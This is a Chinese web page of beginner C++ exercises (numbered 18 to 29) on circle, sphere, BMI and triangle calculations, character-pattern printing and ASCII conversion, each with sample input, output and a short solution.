<h2 id="题目名称-18-圆周长和面积-求圆周长和面积"><a href="#题目名称-18-圆周长和面积-求圆周长和面积" class="headerlink" title="题目名称:18-圆周长和面积 求圆周长和面积"></a>题目名称:18-圆周长和面积 求圆周长和面积</h2><h3 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h3><p>已知一个圆的半径，计算该圆的周长和面积，结果保留2位小数。半径用实数表示，由键盘输入。设圆周率等于3.14159。</p>
<h3 id="输入描述-17"><a href="#输入描述-17" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入在一行中给出1个实数r，表示圆的半径。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-17"><a href="#输出描述-17" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在一行中输出圆的周长和面积，结果保留2位小数。数据之间留一个空格。    </span><br></pre></td></tr></table></figure>

<h3 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h3 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18.85 28.27</span><br></pre></td></tr></table></figure>

<h3 id="代码-17"><a href="#代码-17" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> radius;</span><br><span class="line">    <span class="comment">// 读取圆的半径</span></span><br><span class="line">    cin &gt;&gt; radius;</span><br><span class="line">    <span class="comment">// 计算圆的周长和面积</span></span><br><span class="line">    <span class="type">double</span> pi = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="type">double</span> circumference = <span class="number">2</span> * pi * radius;</span><br><span class="line">    <span class="type">double</span> area = pi * radius * radius;</span><br><span class="line">    <span class="comment">// 设置输出格式，保留两位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf %.2lf\n&quot;</span>, circumference, area);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-19-计算球体的体积"><a href="#题目名称-19-计算球体的体积" class="headerlink" title="题目名称:19-计算球体的体积"></a>题目名称:19-计算球体的体积</h2><h3 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个球体的半径，计算其体积。其中球体体积公式为 V &#x3D; 4&#x2F;3*πr3，其中 π&#x3D; 3.1415926。</p>
<h3 id="输入描述-18"><a href="#输入描述-18" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，用浮点数表示的球体的半径。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-18"><a href="#输出描述-18" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，球体的体积，小数点后保留3位。          </span><br></pre></td></tr></table></figure>

<h3 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.0</span><br></pre></td></tr></table></figure>

<h3 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">113.097</span><br></pre></td></tr></table></figure>

<h3 id="代码-18"><a href="#代码-18" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> radius;</span><br><span class="line">    <span class="comment">// 读取球体的半径</span></span><br><span class="line">    cin &gt;&gt; radius;</span><br><span class="line">    <span class="comment">// 计算球体的体积</span></span><br><span class="line">    <span class="type">double</span> pi = <span class="number">3.1415926</span>;</span><br><span class="line">    <span class="type">double</span> volume = (<span class="number">4.0</span> / <span class="number">3.0</span>) * pi * radius * radius * radius;</span><br><span class="line">    <span class="comment">// 设置输出格式，保留三位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.3lf\n&quot;</span>, volume);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-20-计算体重指数"><a href="#题目名称-20-计算体重指数" class="headerlink" title="题目名称:20-计算体重指数"></a>题目名称:20-计算体重指数</h2><h3 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h3><p>问题：计算BMI指数（身体质量指数）。BMI指数（即身体质量指数，简称体质指数又称体重，英文为Body Mass Index，简称BMI），是用体重公斤数除以身高米数平方得出的数字，是目前国际上常用的衡量人体胖瘦程度以及是否健康的一个标准。主要用于统计用途，当我们需要比较及分析一个人的体重对于不同高度的人所带来的健康影响时，BMI值是一个中立而可靠的指标。</p>
<h3 id="输入描述-19"><a href="#输入描述-19" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，两个整数，分别表示体重（公斤），身高（厘米），中间用一个空格分隔。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-19"><a href="#输出描述-19" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，BMI指数（保留两位小数）。            </span><br></pre></td></tr></table></figure>

<h3 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">70 170</span><br></pre></td></tr></table></figure>

<h3 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">24.22</span><br></pre></td></tr></table></figure>

<h3 id="代码-19"><a href="#代码-19" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">// 体重（公斤）</span></span><br><span class="line">    <span class="type">int</span> height; <span class="comment">// 身高（厘米）</span></span><br><span class="line">    <span class="comment">// 读取体重和身高</span></span><br><span class="line">    cin &gt;&gt; weight &gt;&gt; height;</span><br><span class="line">    <span class="comment">// 转换身高为米</span></span><br><span class="line">    <span class="type">double</span> heightInMeter = <span class="built_in">static_cast</span>&lt;<span class="type">double</span>&gt;(height) / <span class="number">100.0</span>;</span><br><span class="line">    <span class="comment">// 计算BMI指数</span></span><br><span class="line">    <span class="type">double</span> bmi = <span class="built_in">static_cast</span>&lt;<span class="type">double</span>&gt;(weight) / (heightInMeter * heightInMeter);</span><br><span class="line">    <span class="comment">// 设置输出格式，保留两位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>, bmi);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-21-计算三角形的周长和面积"><a href="#题目名称-21-计算三角形的周长和面积" class="headerlink" title="题目名称:21-计算三角形的周长和面积"></a>题目名称:21-计算三角形的周长和面积</h2><h3 id="题目描述-20"><a href="#题目描述-20" class="headerlink" title="题目描述"></a>题目描述</h3><p>  根据给出的三角形3条边a, b, c，计算三角形的周长和面积。 </p>
<p>  数据范围： 0&lt;a,b,c≤100000 0 &lt; a,b,c \le 100000 \ 0&lt;a,b,c≤100000 </p>
<h3 id="输入描述-20"><a href="#输入描述-20" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，三角形3条边（能构成三角形），中间用一个空格隔开。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-20"><a href="#输出描述-20" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，三角形周长和面积（保留两位小数），中间用一个空格隔开，输出具体格式详见输出样例。                </span><br></pre></td></tr></table></figure>

<h3 id="输入-16"><a href="#输入-16" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 3 3</span><br></pre></td></tr></table></figure>

<h3 id="输出-16"><a href="#输出-16" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">circumference=9.00 area=3.90</span><br></pre></td></tr></table></figure>

<h3 id="代码-20"><a href="#代码-20" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> a, b, c;</span><br><span class="line">    <span class="comment">// 读取三角形的三条边</span></span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    <span class="comment">// 计算周长</span></span><br><span class="line">    <span class="type">double</span> perimeter = a + b + c;</span><br><span class="line">    <span class="comment">// 计算面积（使用海伦公式）</span></span><br><span class="line">    <span class="type">double</span> s = perimeter / <span class="number">2.0</span>;</span><br><span class="line">    <span class="type">double</span> area = <span class="built_in">sqrt</span>(s * (s - a) * (s - b) * (s - c));</span><br><span class="line">    <span class="comment">// 设置输出格式，保留两位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;circumference=%.2lf area=%.2lf\n&quot;</span>, perimeter, area);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-22-字符三角形1"><a href="#题目名称-22-字符三角形1" class="headerlink" title="题目名称:22-字符三角形1"></a>题目名称:22-字符三角形1</h2><h3 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h3><p>Kiki想用字符组成一个字符三角形，请编程帮他实现。 	</p>
<h3 id="输入描述-21"><a href="#输入描述-21" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个字符。 </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-21"><a href="#输出描述-21" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用字符组成的三角形，形状如样例所示。             </span><br></pre></td></tr></table></figure>

<h3 id="输入-17"><a href="#输入-17" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure>

<h3 id="输出-17"><a href="#输出-17" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  *</span><br><span class="line"> ***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>

<h3 id="代码-21"><a href="#代码-21" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="comment">// 读取输入字符</span></span><br><span class="line">    cin &gt;&gt; ch;</span><br><span class="line">    <span class="comment">// 打印字符三角形</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// 打印空格</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">3</span> - i; j &gt; <span class="number">0</span>; --j) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="comment">// 打印字符</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="number">2</span> * i - <span class="number">1</span>; ++k) &#123;</span><br><span class="line">            cout &lt;&lt; ch;</span><br><span class="line">        &#125;     </span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-23-字符三角形2"><a href="#题目名称-23-字符三角形2" class="headerlink" title="题目名称:23-字符三角形2"></a>题目名称:23-字符三角形2</h2><h3 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h3><p>Kiki想用字符组成一个长方形，请编程帮他实现。 	</p>
<h3 id="输入描述-22"><a href="#输入描述-22" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个字符。 </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-22"><a href="#输出描述-22" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用字符组成的三角形，形状如样例所示。                </span><br></pre></td></tr></table></figure>

<h3 id="输入-18"><a href="#输入-18" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure>

<h3 id="输出-18"><a href="#输出-18" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line"> ***</span><br><span class="line">  *****</span><br></pre></td></tr></table></figure>

<h3 id="代码-22"><a href="#代码-22" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> character;</span><br><span class="line">    cin &gt;&gt; character;</span><br><span class="line">    <span class="comment">// 第一行</span></span><br><span class="line">    cout &lt;&lt; character &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">// 第二行</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; character &lt;&lt; character &lt;&lt; character &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">// 第三行</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; character &lt;&lt; character &lt;&lt; character &lt;&lt; character &lt;&lt; character &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-24-字符长方形"><a href="#题目名称-24-字符长方形" class="headerlink" title="题目名称:24-字符长方形"></a>题目名称:24-字符长方形</h2><h3 id="题目描述-23"><a href="#题目描述-23" class="headerlink" title="题目描述"></a>题目描述</h3><p>Kiki想用字符组成一个长方形，请编程帮他实现。</p>
<h3 id="输入描述-23"><a href="#输入描述-23" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个字符。    </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-23"><a href="#输出描述-23" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用字符组成的正方形，形状如样例所示。                </span><br></pre></td></tr></table></figure>

<h3 id="输入-19"><a href="#输入-19" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure>

<h3 id="输出-19"><a href="#输出-19" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">***</span><br><span class="line">***</span><br><span class="line">***</span><br></pre></td></tr></table></figure>

<h3 id="代码-23"><a href="#代码-23" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="comment">// 读取输入字符</span></span><br><span class="line">    cin &gt;&gt; ch;</span><br><span class="line">    <span class="comment">// 打印字符正方形</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            cout &lt;&lt; ch;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-25-字符正方形"><a href="#题目名称-25-字符正方形" class="headerlink" title="题目名称:25-字符正方形"></a>题目名称:25-字符正方形</h2><h3 id="题目描述-24"><a href="#题目描述-24" class="headerlink" title="题目描述"></a>题目描述</h3><p>Kiki想用字符组成一个长方形，请编程帮他实现。 </p>
<h3 id="输入描述-24"><a href="#输入描述-24" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个字符。 </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-24"><a href="#输出描述-24" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用字符组成的正方形，形状如样例所示。                  </span><br></pre></td></tr></table></figure>

<h3 id="输入-20"><a href="#输入-20" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure>

<h3 id="输出-20"><a href="#输出-20" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * *</span><br><span class="line">* * *</span><br><span class="line">* * *</span><br></pre></td></tr></table></figure>

<h3 id="代码-24"><a href="#代码-24" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="comment">// 读取输入字符</span></span><br><span class="line">    cin &gt;&gt; ch;</span><br><span class="line">    <span class="comment">// 打印字符正方形</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            cout &lt;&lt; ch &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-26-字符转ASCII码"><a href="#题目名称-26-字符转ASCII码" class="headerlink" title="题目名称:26-字符转ASCII码"></a>题目名称:26-字符转ASCII码</h2><h3 id="题目描述-25"><a href="#题目描述-25" class="headerlink" title="题目描述"></a>题目描述</h3><p>BoBo教KiKi字符常量或字符变量表示的字符在内存中以ASCII码形式存储。BoBo出了一个问题给KiKi，输入一个字符，输出该字符相应的ASCII码。</p>
<h3 id="输入描述-25"><a href="#输入描述-25" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，一个字符。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-25"><a href="#输出描述-25" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，输出输入字符对应的ASCII码。              </span><br></pre></td></tr></table></figure>

<h3 id="输入-21"><a href="#输入-21" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

<h3 id="输出-21"><a href="#输出-21" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">99</span><br></pre></td></tr></table></figure>

<h3 id="代码-25"><a href="#代码-25" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="comment">// 读取输入字符</span></span><br><span class="line">    cin &gt;&gt; ch;</span><br><span class="line">    <span class="comment">// 输出字符对应的ASCII码</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">int</span>(ch) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-27-于老师对你们说"><a href="#题目名称-27-于老师对你们说" class="headerlink" title="题目名称:27-于老师对你们说"></a>题目名称:27-于老师对你们说</h2><h3 id="题目描述-26"><a href="#题目描述-26" class="headerlink" title="题目描述"></a>题目描述</h3><p>于老师相对你们说的话用以下ASCII数字表示78,105,32,109,101,110,32,100,111,117,32,115,104,105,32,104,97,111,32,104,97,105,32,122,105,33，请输出这些ASCII对应的字符，看看于老师相对你们说什么。</p>
<h3 id="输入描述-26"><a href="#输入描述-26" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-26"><a href="#输出描述-26" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">于老师对你们说的话，用字符组成。</span><br></pre></td></tr></table></figure>

<h3 id="代码-26"><a href="#代码-26" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ASCII码数组</span></span><br><span class="line">    <span class="type">int</span> ascii[] = &#123;<span class="number">78</span>, <span class="number">105</span>, <span class="number">32</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">32</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">32</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">32</span>, <span class="number">122</span>, <span class="number">105</span>, <span class="number">33</span>&#125;;</span><br><span class="line">    <span class="comment">// 输出对应的字符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(ascii) / <span class="built_in">sizeof</span>(ascii[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">char</span>(ascii[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-28-小写转大写"><a href="#题目名称-28-小写转大写" class="headerlink" title="题目名称:28-小写转大写"></a>题目名称:28-小写转大写</h2><h3 id="题目描述-27"><a href="#题目描述-27" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入一个小写字母，输出该小写字母对应的大写字母。</p>
<h3 id="输入描述-27"><a href="#输入描述-27" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个小写字母</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-27"><a href="#输出描述-27" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对应的大写字母。      </span><br></pre></td></tr></table></figure>

<h3 id="输入-22"><a href="#输入-22" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure>

<h3 id="输出-22"><a href="#输出-22" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure>

<h3 id="代码-27"><a href="#代码-27" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> lowercase;</span><br><span class="line">    <span class="comment">// 读取输入的小写字母</span></span><br><span class="line">    cin &gt;&gt; lowercase;</span><br><span class="line">    <span class="comment">// 将小写字母转换为大写字母</span></span><br><span class="line">    <span class="type">char</span> uppercase = <span class="built_in">toupper</span>(lowercase);</span><br><span class="line">    <span class="comment">// 输出对应的大写字母</span></span><br><span class="line">    cout &lt;&lt; uppercase &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-29-第x个字母"><a href="#题目名称-29-第x个字母" class="headerlink" title="题目名称:29-第x个字母"></a>题目名称:29-第x个字母</h2><h3 id="题目描述-28"><a href="#题目描述-28" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入一个整数x，输出对应的英文大写字母中的第x个。</p>
<h3 id="输入描述-28"><a href="#输入描述-28" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个整数x(1 ≤ x ≤ 26) </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-28"><a href="#输出描述-28" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第x个字母。                   </span><br></pre></td></tr></table></figure>

<h3 id="输入-23"><a href="#输入-23" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<h3 id="输出-23"><a href="#输出-23" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure>

